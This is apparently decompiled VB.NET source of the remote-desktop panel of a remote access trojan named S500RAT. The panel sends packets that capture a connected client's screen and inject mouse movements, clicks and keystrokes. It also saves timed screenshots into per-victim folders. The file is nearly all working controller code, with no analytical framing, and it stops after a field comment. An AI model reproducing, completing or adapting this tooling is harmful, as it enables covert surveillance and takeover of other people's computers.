Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S.StreamLibrary
Imports S.StreamLibrary.UnsafeCodecs
Imports S500RAT.My.Resources
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x0200002D RID: 45
	<DesignerGenerated()>
	Public Partial Class FormRemoteDesktop
		Inherits Form

		' Token: 0x17000353 RID: 851
		' (get) Token: 0x06000876 RID: 2166 RVA: 0x00046D23 File Offset: 0x00044F23
		' (set) Token: 0x06000877 RID: 2167 RVA: 0x00046D30 File Offset: 0x00044F30
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000354 RID: 852
		' (get) Token: 0x06000878 RID: 2168 RVA: 0x00046D73 File Offset: 0x00044F73
		' (set) Token: 0x06000879 RID: 2169 RVA: 0x00046D7D File Offset: 0x00044F7D
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x17000355 RID: 853
		' (get) Token: 0x0600087A RID: 2170 RVA: 0x00046D86 File Offset: 0x00044F86
		' (set) Token: 0x0600087B RID: 2171 RVA: 0x00046D90 File Offset: 0x00044F90
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000356 RID: 854
		' (get) Token: 0x0600087C RID: 2172 RVA: 0x00046D99 File Offset: 0x00044F99
		' (set) Token: 0x0600087D RID: 2173 RVA: 0x00046DA3 File Offset: 0x00044FA3
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x17000357 RID: 855
		' (get) Token: 0x0600087E RID: 2174 RVA: 0x00046DAC File Offset: 0x00044FAC
		' (set) Token: 0x0600087F RID: 2175 RVA: 0x00046DB6 File Offset: 0x00044FB6
		Friend Overridable Property UiMillisecondTimer1 As UIMillisecondTimer

		' Token: 0x17000358 RID: 856
		' (get) Token: 0x06000880 RID: 2176 RVA: 0x00046DBF File Offset: 0x00044FBF
		' (set) Token: 0x06000881 RID: 2177 RVA: 0x00046DC9 File Offset: 0x00044FC9
		Friend Overridable Property UiToolTip1 As UIToolTip

		' Token: 0x17000359 RID: 857
		' (get) Token: 0x06000882 RID: 2178 RVA: 0x00046DD2 File Offset: 0x00044FD2
		' (set) Token: 0x06000883 RID: 2179 RVA: 0x00046DDC File Offset: 0x00044FDC
		Friend Overridable Property TimerSave As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._TimerSave
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.TimerSave_Tick
				Dim timerSave As System.Windows.Forms.Timer = Me._TimerSave
				If timerSave IsNot Nothing Then
					RemoveHandler timerSave.Tick, value2
				End If
				Me._TimerSave = value
				timerSave = Me._TimerSave
				If timerSave IsNot Nothing Then
					AddHandler timerSave.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700035A RID: 858
		' (get) Token: 0x06000884 RID: 2180 RVA: 0x00046E1F File Offset: 0x0004501F
		' (set) Token: 0x06000885 RID: 2181 RVA: 0x00046E2C File Offset: 0x0004502C
		Public Overridable Property StartAndStop As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._StartAndStop
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.StartAndStop_Click_1
				Dim startAndStop As Guna2GradientButton = Me._StartAndStop
				If startAndStop IsNot Nothing Then
					RemoveHandler startAndStop.Click, value2
				End If
				Me._StartAndStop = value
				startAndStop = Me._StartAndStop
				If startAndStop IsNot Nothing Then
					AddHandler startAndStop.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700035B RID: 859
		' (get) Token: 0x06000886 RID: 2182 RVA: 0x00046E6F File Offset: 0x0004506F
		' (set) Token: 0x06000887 RID: 2183 RVA: 0x00046E7C File Offset: 0x0004507C
		Public Overridable Property Mouse As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._Mouse
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.Mouse_CheckedChanged
				Dim mouse As Guna2ToggleSwitch = Me._Mouse
				If mouse IsNot Nothing Then
					RemoveHandler mouse.CheckedChanged, value2
				End If
				Me._Mouse = value
				mouse = Me._Mouse
				If mouse IsNot Nothing Then
					AddHandler mouse.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700035C RID: 860
		' (get) Token: 0x06000888 RID: 2184 RVA: 0x00046EBF File Offset: 0x000450BF
		' (set) Token: 0x06000889 RID: 2185 RVA: 0x00046EC9 File Offset: 0x000450C9
		Friend Overridable Property Label1 As Label

		' Token: 0x1700035D RID: 861
		' (get) Token: 0x0600088A RID: 2186 RVA: 0x00046ED2 File Offset: 0x000450D2
		' (set) Token: 0x0600088B RID: 2187 RVA: 0x00046EDC File Offset: 0x000450DC
		Public Overridable Property Video As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._Video
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.Video_CheckedChanged_1
				Dim video As Guna2ToggleSwitch = Me._Video
				If video IsNot Nothing Then
					RemoveHandler video.CheckedChanged, value2
				End If
				Me._Video = value
				video = Me._Video
				If video IsNot Nothing Then
					AddHandler video.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700035E RID: 862
		' (get) Token: 0x0600088C RID: 2188 RVA: 0x00046F1F File Offset: 0x0004511F
		' (set) Token: 0x0600088D RID: 2189 RVA: 0x00046F2C File Offset: 0x0004512C
		Public Overridable Property Keyboard As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._Keyboard
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.Keyboard_CheckedChanged
				Dim keyboard As Guna2ToggleSwitch = Me._Keyboard
				If keyboard IsNot Nothing Then
					RemoveHandler keyboard.CheckedChanged, value2
				End If
				Me._Keyboard = value
				keyboard = Me._Keyboard
				If keyboard IsNot Nothing Then
					AddHandler keyboard.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700035F RID: 863
		' (get) Token: 0x0600088E RID: 2190 RVA: 0x00046F6F File Offset: 0x0004516F
		' (set) Token: 0x0600088F RID: 2191 RVA: 0x00046F79 File Offset: 0x00045179
		Friend Overridable Property Label22 As Label

		' Token: 0x17000360 RID: 864
		' (get) Token: 0x06000890 RID: 2192 RVA: 0x00046F82 File Offset: 0x00045182
		' (set) Token: 0x06000891 RID: 2193 RVA: 0x00046F8C File Offset: 0x0004518C
		Friend Overridable Property Label2 As Label

		' Token: 0x17000361 RID: 865
		' (get) Token: 0x06000892 RID: 2194 RVA: 0x00046F95 File Offset: 0x00045195
		' (set) Token: 0x06000893 RID: 2195 RVA: 0x00046FA0 File Offset: 0x000451A0
		Friend Overridable Property PictureBox1 As PictureBox
			<CompilerGenerated()>
			Get
				Return Me._PictureBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Dim value2 As MouseEventHandler = AddressOf Me.PictureBox1_MouseDown
				Dim value3 As MouseEventHandler = AddressOf Me.PictureBox1_MouseUp
				Dim value4 As MouseEventHandler = AddressOf Me.PictureBox1_MouseMove
				Dim value5 As KeyEventHandler = AddressOf Me.PictureBox1_KeyDown
				Dim value6 As KeyEventHandler = AddressOf Me.PictureBox1_KeyUp
				Dim value7 As EventHandler = AddressOf Me.PictureBox1_Click
				Dim pictureBox As PictureBox = Me._PictureBox1
				If pictureBox IsNot Nothing Then
					RemoveHandler pictureBox.MouseDown, value2
					RemoveHandler pictureBox.MouseUp, value3
					RemoveHandler pictureBox.MouseMove, value4
					RemoveHandler pictureBox.KeyDown, value5
					RemoveHandler pictureBox.KeyUp, value6
					RemoveHandler pictureBox.Click, value7
				End If
				Me._PictureBox1 = value
				pictureBox = Me._PictureBox1
				If pictureBox IsNot Nothing Then
					AddHandler pictureBox.MouseDown, value2
					AddHandler pictureBox.MouseUp, value3
					AddHandler pictureBox.MouseMove, value4
					AddHandler pictureBox.KeyDown, value5
					AddHandler pictureBox.KeyUp, value6
					AddHandler pictureBox.Click, value7
				End If
			End Set
		End Property

		' Token: 0x17000362 RID: 866
		' (get) Token: 0x06000894 RID: 2196 RVA: 0x00047080 File Offset: 0x00045280
		' (set) Token: 0x06000895 RID: 2197 RVA: 0x0004708A File Offset: 0x0004528A
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x17000363 RID: 867
		' (get) Token: 0x06000896 RID: 2198 RVA: 0x00047093 File Offset: 0x00045293
		' (set) Token: 0x06000897 RID: 2199 RVA: 0x0004709D File Offset: 0x0004529D
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x17000364 RID: 868
		' (get) Token: 0x06000898 RID: 2200 RVA: 0x000470A6 File Offset: 0x000452A6
		' (set) Token: 0x06000899 RID: 2201 RVA: 0x000470B0 File Offset: 0x000452B0
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000365 RID: 869
		' (get) Token: 0x0600089A RID: 2202 RVA: 0x000470F3 File Offset: 0x000452F3
		' (set) Token: 0x0600089B RID: 2203 RVA: 0x000470FD File Offset: 0x000452FD
		Friend Overridable Property Quality As Guna2HtmlLabel

		' Token: 0x17000366 RID: 870
		' (get) Token: 0x0600089C RID: 2204 RVA: 0x00047106 File Offset: 0x00045306
		' (set) Token: 0x0600089D RID: 2205 RVA: 0x00047110 File Offset: 0x00045310
		Friend Overridable Property QualityUsing As Guna2TrackBar
			<CompilerGenerated()>
			Get
				Return Me._QualityUsing
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TrackBar)
				Dim value2 As ScrollEventHandler = AddressOf Me.QualityUsing_Scroll
				Dim qualityUsing As Guna2TrackBar = Me._QualityUsing
				If qualityUsing IsNot Nothing Then
					RemoveHandler qualityUsing.Scroll, value2
				End If
				Me._QualityUsing = value
				qualityUsing = Me._QualityUsing
				If qualityUsing IsNot Nothing Then
					AddHandler qualityUsing.Scroll, value2
				End If
			End Set
		End Property

		' Token: 0x17000367 RID: 871
		' (get) Token: 0x0600089E RID: 2206 RVA: 0x00047153 File Offset: 0x00045353
		' (set) Token: 0x0600089F RID: 2207 RVA: 0x0004715D File Offset: 0x0004535D
		Friend Overridable Property DisplayScreen As Label

		' Token: 0x17000368 RID: 872
		' (get) Token: 0x060008A0 RID: 2208 RVA: 0x00047166 File Offset: 0x00045366
		' (set) Token: 0x060008A1 RID: 2209 RVA: 0x00047170 File Offset: 0x00045370
		Private Overridable Property Label9 As Label

		' Token: 0x17000369 RID: 873
		' (get) Token: 0x060008A2 RID: 2210 RVA: 0x00047179 File Offset: 0x00045379
		' (set) Token: 0x060008A3 RID: 2211 RVA: 0x00047183 File Offset: 0x00045383
		Friend Overridable Property SizeImage As Label

		' Token: 0x1700036A RID: 874
		' (get) Token: 0x060008A4 RID: 2212 RVA: 0x0004718C File Offset: 0x0004538C
		' (set) Token: 0x060008A5 RID: 2213 RVA: 0x00047196 File Offset: 0x00045396
		Private Overridable Property Label4 As Label

		' Token: 0x1700036B RID: 875
		' (get) Token: 0x060008A6 RID: 2214 RVA: 0x0004719F File Offset: 0x0004539F
		' (set) Token: 0x060008A7 RID: 2215 RVA: 0x000471A9 File Offset: 0x000453A9
		Friend Overridable Property ImageSaved As Label

		' Token: 0x1700036C RID: 876
		' (get) Token: 0x060008A8 RID: 2216 RVA: 0x000471B2 File Offset: 0x000453B2
		' (set) Token: 0x060008A9 RID: 2217 RVA: 0x000471BC File Offset: 0x000453BC
		Friend Overridable Property FPS As Label

		' Token: 0x1700036D RID: 877
		' (get) Token: 0x060008AA RID: 2218 RVA: 0x000471C5 File Offset: 0x000453C5
		' (set) Token: 0x060008AB RID: 2219 RVA: 0x000471CF File Offset: 0x000453CF
		Private Overridable Property Label5 As Label

		' Token: 0x1700036E RID: 878
		' (get) Token: 0x060008AC RID: 2220 RVA: 0x000471D8 File Offset: 0x000453D8
		' (set) Token: 0x060008AD RID: 2221 RVA: 0x000471E2 File Offset: 0x000453E2
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x1700036F RID: 879
		' (get) Token: 0x060008AE RID: 2222 RVA: 0x000471EB File Offset: 0x000453EB
		' (set) Token: 0x060008AF RID: 2223 RVA: 0x000471F5 File Offset: 0x000453F5
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x17000370 RID: 880
		' (get) Token: 0x060008B0 RID: 2224 RVA: 0x000471FE File Offset: 0x000453FE
		' (set) Token: 0x060008B1 RID: 2225 RVA: 0x00047208 File Offset: 0x00045408
		Public Property Client As Clients

		' Token: 0x17000371 RID: 881
		' (get) Token: 0x060008B2 RID: 2226 RVA: 0x00047211 File Offset: 0x00045411
		' (set) Token: 0x060008B3 RID: 2227 RVA: 0x0004721B File Offset: 0x0004541B
		Public Property F As FormS500

		' Token: 0x17000372 RID: 882
		' (get) Token: 0x060008B4 RID: 2228 RVA: 0x00047224 File Offset: 0x00045424
		' (set) Token: 0x060008B5 RID: 2229 RVA: 0x0004722E File Offset: 0x0004542E
		Public Property FullPath As String

		' Token: 0x17000373 RID: 883
		' (get) Token: 0x060008B6 RID: 2230 RVA: 0x00047237 File Offset: 0x00045437
		' (set) Token: 0x060008B7 RID: 2231 RVA: 0x00047241 File Offset: 0x00045441
		Friend Property ParentClient As Clients

		' Token: 0x17000374 RID: 884
		' (get) Token: 0x060008B8 RID: 2232 RVA: 0x0004724A File Offset: 0x0004544A
		' (set) Token: 0x060008B9 RID: 2233 RVA: 0x00047254 File Offset: 0x00045454
		Public Property GetImage As Image

		' Token: 0x060008BA RID: 2234 RVA: 0x00047260 File Offset: 0x00045460
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormRemoteDesktop_Load
			AddHandler MyBase.Resize, AddressOf Me.FormRemoteDesktop_Resize
			Me.FormSize = False
			Me.IntFPS = 0
			Me.sw = Stopwatch.StartNew()
			Me.decoder = New UnsafeStreamCodec(60, True)
			Me.syncPicbox = RuntimeHelpers.GetObjectValue(New Object())
			Me._keysPressed = New List(Of Keys)()
			Me.InitializeComponent()
		End Sub

		' Token: 0x060008BB RID: 2235 RVA: 0x000472E4 File Offset: 0x000454E4
		Private Sub FormRemoteDesktop_Load(sender As Object, e As EventArgs)
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
			Dim text As String = Path.Combine(Application.StartupPath, "Clients", "Remote Desktop\" + Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2)) + "\"
			Dim flag As Boolean = Not Directory.Exists(text)
			If flag Then
				Directory.CreateDirectory(text)
				Me.FullPath = text
			Else
				Me.FullPath = text
			End If
			Me.PictureBox1.Focus()
		End Sub

		' Token: 0x060008BC RID: 2236 RVA: 0x00047434 File Offset: 0x00045634
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x060008BD RID: 2237 RVA: 0x000474A0 File Offset: 0x000456A0
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x060008BE RID: 2238 RVA: 0x000474B8 File Offset: 0x000456B8
		Private Sub FormRemoteDesktop_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x060008BF RID: 2239 RVA: 0x0004754C File Offset: 0x0004574C
		Private Sub StartAndStop_Click_1(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(Me.StartAndStop.Tag, "Start", False)
			If flag Then
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "capture"
				msgPack.ForcePathObject("Quality").AsInteger = CLng(Convert.ToInt32(Me.QualityUsing.Value))
				msgPack.ForcePathObject("Screen").AsInteger = CLng(Convert.ToInt32(0))
				Me.decoder = New UnsafeStreamCodec(Convert.ToInt32(Me.QualityUsing.Value), True)
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Me.StartAndStop.Tag = "Stop"
				Me.StartAndStop.Text = "Stop"
				Me.StartAndStop.FillColor = Color.FromArgb(26, 31, 55)
				Me.StartAndStop.FillColor2 = Color.FromArgb(26, 31, 55)
				Me.QualityUsing.Enabled = False
			Else
				Me.QualityUsing.Enabled = True
				Me.StartAndStop.Tag = "Start"
				Me.StartAndStop.Text = "Start"
				Dim msgPack2 As MsgPack = New MsgPack()
				msgPack2.ForcePathObject("Packet").AsString = "stop"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
				Me.PictureBox1.Image.Clone()
				Me.StartAndStop.FillColor = Color.FromArgb(26, 155, 161)
				Me.StartAndStop.FillColor2 = Color.FromArgb(26, 155, 161)
			End If
		End Sub

		' Token: 0x060008C0 RID: 2240 RVA: 0x00047720 File Offset: 0x00045920
		Private Sub PictureBox1_MouseDown(sender As Object, e As MouseEventArgs)
			Try
				Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(Me.StartAndStop.Tag, "Stop", False) AndAlso Me.PictureBox1.Image IsNot Nothing AndAlso Me.Mouse.Checked
				If flag Then
					' The following expression was wrapped in a checked-expression
					Dim point As Point = New Point(CInt(Math.Round(CDbl((e.X * Me.rdSize.Width)) / CDbl(Me.PictureBox1.Width))), CInt(Math.Round(CDbl((e.Y * Me.rdSize.Height)) / CDbl(Me.PictureBox1.Height))))
					Dim num As Integer = 0
					Dim flag2 As Boolean = e.Button = MouseButtons.Left
					If flag2 Then
						num = 2
					End If
					Dim flag3 As Boolean = e.Button = MouseButtons.Right
					If flag3 Then
						num = 8
					End If
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "mouseClick"
					msgPack.ForcePathObject("X").AsInteger = CLng(point.X)
					msgPack.ForcePathObject("Y").AsInteger = CLng(point.Y)
					msgPack.ForcePathObject("Button").AsInteger = CLng(num)
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060008C1 RID: 2241 RVA: 0x00047894 File Offset: 0x00045A94
		Private Sub PictureBox1_MouseUp(sender As Object, e As MouseEventArgs)
			Try
				Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(Me.StartAndStop.Tag, "Stop", False) AndAlso Me.PictureBox1.Image IsNot Nothing AndAlso Me.Mouse.Checked
				If flag Then
					' The following expression was wrapped in a checked-expression
					Dim point As Point = New Point(CInt(Math.Round(CDbl((e.X * Me.rdSize.Width)) / CDbl(Me.PictureBox1.Width))), CInt(Math.Round(CDbl((e.Y * Me.rdSize.Height)) / CDbl(Me.PictureBox1.Height))))
					Dim num As Integer = 0
					Dim flag2 As Boolean = e.Button = MouseButtons.Left
					If flag2 Then
						num = 4
					End If
					Dim flag3 As Boolean = e.Button = MouseButtons.Right
					If flag3 Then
						num = 16
					End If
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "mouseClick"
					msgPack.ForcePathObject("X").AsInteger = CLng(point.X)
					msgPack.ForcePathObject("Y").AsInteger = CLng(point.Y)
					msgPack.ForcePathObject("Button").AsInteger = CLng(num)
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060008C2 RID: 2242 RVA: 0x00047A08 File Offset: 0x00045C08
		Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs)
			Try
				Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(Me.StartAndStop.Tag, "Stop", False) AndAlso Me.PictureBox1.Image IsNot Nothing AndAlso Me.Mouse.Checked
				If flag Then
					Me.PictureBox1.Focus()
					Dim point As Point = New Point(CInt(Math.Round(CDbl(e.X) * (CDbl(Me.rdSize.Width) / CDbl(Me.PictureBox1.Width)))), CInt(Math.Round(CDbl(e.Y) * (CDbl(Me.rdSize.Height) / CDbl(Me.PictureBox1.Height)))))
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "mouseMove"
					msgPack.ForcePathObject("X").AsInteger = CLng(point.X)
					msgPack.ForcePathObject("Y").AsInteger = CLng(point.Y)
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Me.PictureBox1.Focus()
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060008C3 RID: 2243 RVA: 0x00047B58 File Offset: 0x00045D58
		Private Sub PictureBox1_KeyDown(sender As Object, e As KeyEventArgs)
			Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(Me.StartAndStop.Tag, "Stop", False) AndAlso Me.PictureBox1.Image IsNot Nothing AndAlso Me.Keyboard.Checked
			If flag Then
				Me.PictureBox1.Focus()
				Dim flag2 As Boolean = Not Me.IsLockKey(e.KeyCode)
				If flag2 Then
					e.Handled = True
				End If
				Dim flag3 As Boolean = Me._keysPressed.Contains(e.KeyCode)
				If Not flag3 Then
					Me._keysPressed.Add(e.KeyCode)
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "keyboardClick"
					msgPack.ForcePathObject("key").AsInteger = CLng(Convert.ToInt32(CInt(e.KeyCode)))
					msgPack.ForcePathObject("keyIsDown").SetAsBoolean(True)
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				End If
			End If
		End Sub

		' Token: 0x060008C4 RID: 2244 RVA: 0x00047C5C File Offset: 0x00045E5C
		Private Sub PictureBox1_KeyUp(sender As Object, e As KeyEventArgs)
			Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(Me.StartAndStop.Tag, "Stop", False) AndAlso Me.PictureBox1.Image IsNot Nothing AndAlso Me.Keyboard.Checked
			If flag Then
				Me.PictureBox1.Focus()
				Dim flag2 As Boolean = Not Me.IsLockKey(e.KeyCode)
				If flag2 Then
					e.Handled = True
				End If
				Me._keysPressed.Remove(e.KeyCode)
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "remoteDesktop"
				msgPack.ForcePathObject("Option").AsString = "keyboardClick"
				msgPack.ForcePathObject("key").AsInteger = CLng(Convert.ToInt32(CInt(e.KeyCode)))
				msgPack.ForcePathObject("keyIsDown").SetAsBoolean(False)
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x060008C5 RID: 2245 RVA: 0x00047D60 File Offset: 0x00045F60
		Private Function IsLockKey(key As Keys) As Boolean
			Return(key And Keys.Capital) = Keys.Capital OrElse (key And Keys.NumLock) = Keys.NumLock OrElse (key And Keys.Scroll) = Keys.Scroll
		End Function

		' Token: 0x060008C6 RID: 2246 RVA: 0x00047D9C File Offset: 0x00045F9C
		Private Sub TimerSave_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Directory.Exists(Me.FullPath)
				If flag Then
					Directory.CreateDirectory(Me.FullPath)
				End If
				Dim quality As Encoder = Encoder.Quality
				Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
				Dim encoderParameter As EncoderParameter = New EncoderParameter(quality, 50L)
				encoderParameters.Param(0) = encoderParameter
				Dim encoder As ImageCodecInfo = Me.GetEncoder(ImageFormat.Jpeg)
				Me.PictureBox1.Image.Save(Me.FullPath + String.Format("\\IMG_{0:MM-dd-yyyy HH;mm;ss}.jpeg", DateTime.Now), encoder, encoderParameters)
				If encoderParameters IsNot Nothing Then
					encoderParameters.Dispose()
				End If
				If encoderParameter IsNot Nothing Then
					encoderParameter.Dispose()
				End If
				Dim imageSaved As Label = Me.ImageSaved
				Dim label As Label = imageSaved
				imageSaved.Text = Conversions.ToString(Conversions.ToDouble(label.Text) + 1.0)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060008C7 RID: 2247 RVA: 0x00047E8C File Offset: 0x0004608C
		Private Function GetEncoder(format As ImageFormat) As ImageCodecInfo
			Dim imageDecoders As ImageCodecInfo() = ImageCodecInfo.GetImageDecoders()
			For Each imageCodecInfo As ImageCodecInfo In imageDecoders
				Dim flag As Boolean = imageCodecInfo.FormatID = format.Guid
				If flag Then
					Return imageCodecInfo
				End If
			Next
			Return Nothing
		End Function

		' Token: 0x060008C8 RID: 2248 RVA: 0x00047EE0 File Offset: 0x000460E0
		Private Sub Video_CheckedChanged(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(Me.StartAndStop.Tag, "Stop", False)
			If flag Then
				Dim enabled As Boolean = Me.TimerSave.Enabled
				If enabled Then
					Me.TimerSave.[Stop]()
				Else
					Me.TimerSave.Start()
					Try
						Dim flag2 As Boolean = Not Directory.Exists(Me.FullPath)
						If flag2 Then
							Directory.CreateDirectory(Me.FullPath)
						End If
						Process.Start(Me.FullPath)
					Catch ex As Exception
					End Try
				End If
			End If
		End Sub

		' Token: 0x060008C9 RID: 2249 RVA: 0x00047F84 File Offset: 0x00046184
		Private Sub Mouse_CheckedChanged(sender As Object, e As EventArgs)
			Me.PictureBox1.Focus()
		End Sub

		' Token: 0x060008CA RID: 2250 RVA: 0x00047F93 File Offset: 0x00046193
		Private Sub Keyboard_CheckedChanged(sender As Object, e As EventArgs)
			Me.PictureBox1.Focus()
		End Sub

		' Token: 0x060008CB RID: 2251 RVA: 0x00047FA4 File Offset: 0x000461A4
		Private Sub Video_CheckedChanged_1(sender As Object, e As EventArgs)
			Dim checked As Boolean = Me.Video.Checked
			If checked Then
				Me.TimerSave.Enabled = True
			Else
				Me.TimerSave.Enabled = False
			End If
		End Sub

		' Token: 0x060008CC RID: 2252 RVA: 0x00047FE0 File Offset: 0x000461E0
		Private Sub QualityUsing_Scroll(sender As Object, e As ScrollEventArgs)
			Try
				Dim flag As Boolean = Me.QualityUsing.Value < 11
				If flag Then
					Me.Quality.Text = Conversions.ToString(10) + "%Quality"
				Else
					Me.Quality.Text = Conversions.ToString(Me.QualityUsing.Value) + "%Quality"
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060008CD RID: 2253 RVA: 0x0004806C File Offset: 0x0004626C
		Private Sub PictureBox1_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x040003E3 RID: 995
		Private FormSize As Boolean

		' Token: 0x040003E4 RID: 996
		Public IntFPS As Integer

		' Token: 0x040003E5 RID: 997
		Public sw As Stopwatch

		' Token: 0x040003E6 RID: 998
		Public decoder As IUnsafeCodec

		' Token: 0x040003E7 RID: 999
		Public rdSize As Size

		' Token: 0x040003E8 RID: 1000
